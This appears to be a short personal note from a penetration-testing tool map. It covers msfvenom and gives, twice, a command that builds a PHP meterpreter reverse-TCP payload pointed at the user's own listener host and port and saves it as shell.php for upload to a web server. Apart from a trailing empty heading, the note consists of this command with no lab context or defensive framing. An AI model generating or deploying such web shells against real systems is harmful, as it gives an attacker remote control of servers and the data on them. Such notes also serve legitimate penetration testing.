---
date: 2022-06-23
modified: 2022-07-15
---
## Metadata
up:: [[Toolmap]]

---
## Info
```ad-info
title: =
```
---
## Usage
```bash
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n'> shell.php && pbpaste >> shell.php
```
## Note
### Basic
```bash
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n'> shell.php && pbpaste >> shell.php
```
### ALL Param

